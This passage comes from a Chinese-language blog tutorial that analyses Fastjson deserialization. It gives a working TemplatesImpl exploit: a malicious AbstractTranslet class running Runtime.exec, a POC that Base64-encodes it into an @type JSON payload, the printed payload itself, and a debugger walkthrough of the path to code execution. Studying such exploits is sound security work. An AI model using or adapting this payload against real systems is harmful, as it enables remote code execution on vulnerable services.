com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC.java  Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.IOUtils;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;  </span><br><span class="line"><span class="comment">//用于encode</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClass</span><span class="params">(String cls)</span>&#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(cls)), bos);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="comment">//主方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileSeparator</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;file.separator&quot;</span>);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">evilClassPath</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;\\src\\main\\java\\FastJson\\TemplateImpl\\Test.class&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">evilCode</span> <span class="operator">=</span> readClass(evilClassPath);  </span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">text1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +  </span><br><span class="line">                    <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +  </span><br><span class="line">                    <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;  </span><br><span class="line">            System.out.println(text1);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);  </span><br><span class="line">            <span class="comment">//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);  </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.jpg"></p><p>看到 输出 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="string">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHACEMACIAIwEABGNhbGMMACQAJQEAGkZhc3RKc29uL1RlbXBsYXRlSW1wbC9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAoABAALAA0ADAAMAAAABAABAA0AAQAOAA8AAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABAADAAAAAQAAQAQAAEADgARAAIACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAUAAwAAAAEAAEAEAAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAAXAAgAGAAMAAAABAABABQAAQAVAAAAAgAW&quot;</span>],<span class="string">&#x27;_name&#x27;</span>:<span class="string">&#x27;a.b&#x27;</span>,<span class="string">&#x27;_tfactory&#x27;</span>:&#123; &#125;,<span class="string">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="string">&quot;_name&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="string">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>其中 讲解POC 几个重要的 JSON键 ：</p><ul><li>@__type 指定的解析类，即 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，<code>_bytecodes</code>和<code>_name</code>都是私有属性，这也是我刚刚说的，为什么需要在<code>parseObject()</code>时设置<code>Feature.SupportNonPublicField</code>；</li><li>__bytecodes – 恶意字节码</li><li>__outputProperties – 反序列化中 会自动调用 getter 方法，则调用到 getOutputProperties()方法，进而导致命令执行</li><li>__tfactory:{} – 在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；当时我们设置的是  setFieldValue(obj, “_tfactory”, new TransformerFactoryImpl());</li></ul><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>在 反序列化代码处打断点 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.jpg"></p><p>跟进函数  发现这里调用了   DefaultJSONParser.parse()</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.jpg"></p><p>继续跟进， 这里的parser()方法 是对JSON中的内容进行扫描，算此处的token，在switch语句中匹配上了”{“即token对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.jpg"></p><p>跟进 在DefaultJSONParser. parseObject()  中，审计下其代码 因为是token &#x3D; 12 所以跳到 下面的 else 方法内 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">    lexer.skipWhitespace();  </span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();  </span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;  </span><br><span class="line">        <span class="keyword">while</span>(ch == <span class="string">&#x27;,&#x27;</span>) &#123;  </span><br><span class="line">            lexer.next();  </span><br><span class="line">            lexer.skipWhitespace();  </span><br><span class="line">            ch = lexer.getCurrent();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的  skipWhitespace 是做了 去空的字符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">skipWhitespace</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ch &lt;= <span class="string">&#x27;/&#x27;</span>) &#123;  </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27; &#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\r&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\n&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\t&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\f&#x27;</span> || <span class="built_in">this</span>.ch == <span class="string">&#x27;\b&#x27;</span>) &#123;  </span><br><span class="line">                    <span class="built_in">this</span>.next();  </span><br><span class="line">                    <span class="keyword">continue</span>;                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;/&#x27;</span>) &#123;  </span><br><span class="line">                    <span class="built_in">this</span>.skipComment();  </span><br><span class="line">                    <span class="keyword">continue</span>;                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们是  “ “ “ 双引号开头，到此处调用 scanSymbol()，获取双引号内的内容<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.jpg"></p><p>这里得到第一个双引号里的内容为 “ @type “<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p><p>往下调试，途中经过几个if判断，再做了一些 去空操作 来到此处  判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p>跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以” [ “开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说<strong>这两个判断条件是后面补丁绕过的漏洞点</strong>，值得注意</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.jpg"><br>此处 加载 TemplatesImpl 类后，然后将 该类名 存储到Map 中 最后返回该类，该过程就是 加载该类 存储到Mapping中 ，并返回，后面会说mapping 的作用</p><p>返回到    DefaultJSONParser.parseObject()中往下执行，在最后调用JavaBeanDeserializer.deserialze()对目标类进行反序列化：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.jpg"></p><p>跟进去，循环扫描解析，解析到key为<code>_bytecodes</code>时，调用parseField()进一步解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="type">int</span> features)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (type != JSON.class &amp;&amp; type != JSONObject.class) &#123;  </span><br><span class="line">        <span class="type">JSONLexerBase</span> <span class="variable">lexer</span> <span class="operator">=</span> (JSONLexerBase)parser.lexer;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">token</span> <span class="operator">=</span> lexer.token();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125; else &#123;  </span></span><br><span class="line"><span class="comment">    boolean match = this.parseField(parser, key, object, type, fieldValues);</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.jpg"></p><p>在parseField()中，会调用DefaultFieldDeserializer.parseField()对<code>_bytecodes</code>对应的内容进行解析</p><p>跟进DefaultFieldDeserializer.parseField()函数中，解析出<code>_bytecodes</code>对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.jpg"><br>FieldDeserializer.setValue()函数，看到是调用<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的set方法来设置<code>_bytecodes</code>的值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;  </span><br><span class="line">    field.set(object, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。</p><p>当解析到<code>_outputProperties</code>的内容时，看到前面的下划线被去掉了：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.jpg"></p><p>跟进该方法，发现会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.jpg"></p><p>跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法，之后就是我们熟悉的 调用newTransformer()</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.jpg"></p><p>跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.jpg"><br>继续跟进</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"><br> 可以看到 已经解析到 Test 类，并新建一个 Test类实例，注意前面会先调用 defineTransletClasses()方法来生成一个Java类（Test类）</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.jpg"></p><p>再往下就是新建 Test 实例的过程，并调用 Test类的构造函数 ~</p><p>紧接着就是弹出计算器，整个调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">11</span>, Test  </span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">57</span>, NativeConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)  </span><br><span class="line">newInstance:<span class="number">526</span>, Constructor (java.lang.reflect)  </span><br><span class="line">newInstance:<span class="number">383</span>, Class (java.lang)  </span><br><span class="line">getTransletInstance:<span class="number">408</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  </span><br><span class="line">newTransformer:<span class="number">439</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  </span><br><span class="line">getOutputProperties:<span class="number">460</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)  </span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">57</span>, NativeMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)  </span><br><span class="line">invoke:<span class="number">606</span>, Method (java.lang.reflect)  </span><br><span class="line">setValue:<span class="number">85</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseField:<span class="number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseField:<span class="number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">deserialze:<span class="number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseObject:<span class="number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parse:<span class="number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">deserialze:<span class="number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)  </span><br><span class="line">parseObject:<span class="number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)  </span><br><span class="line">parseObject:<span class="number">339</span>, JSON (com.alibaba.fastjson)  </span><br><span class="line">parseObject:<span class="number">302</span>, JSON (com.alibaba.fastjson)  </span><br><span class="line">main:<span class="number">35</span>, PoC</span><br></pre></td></tr></table></figure><p>最后说下细节部分，在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"></p><h3 id="为什么恶意类需要继承-AbstractTranslet类"><a href="#为什么恶意类需要继承-AbstractTranslet类" class="headerlink" title="为什么恶意类需要继承 AbstractTranslet类"></a>为什么恶意类需要继承 AbstractTranslet类</h3><p>在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：</p><p><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.jpg"></p><p>在还原此类时，会判断该父类是否为 ABSTRACT_TRANSLET，如果是的话，将会设置为for 开始的初始值  0 ，如果不是，将抛出异常，这也是为什么需要继承 ABSTRACT_TRANSLET。</p><h3 id="为什么需要对-bytecodes-进行Base64编码"><a href="#为什么需要对-bytecodes-进行Base64编码" class="headerlink" title="为什么需要对 __bytecodes 进行Base64编码"></a>为什么需要对 __bytecodes 进行Base64编码</h3><p>可以发现，在PoC中的<code>_bytecodes</code>字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对<code>_bytecodes</code>字段进行Base64加密处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> &#123;  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.lexer;  </span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.NULL) &#123;  </span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;  </span><br><span class="line">        <span class="type">byte</span>[] bytes = lexer.bytesValue();  </span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);  </span><br><span class="line">        <span class="keyword">return</span> (T) bytes;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其实它的调用实在setValue()前面进行处理的：<br><img src="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"></p><p>跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：</p><p><img 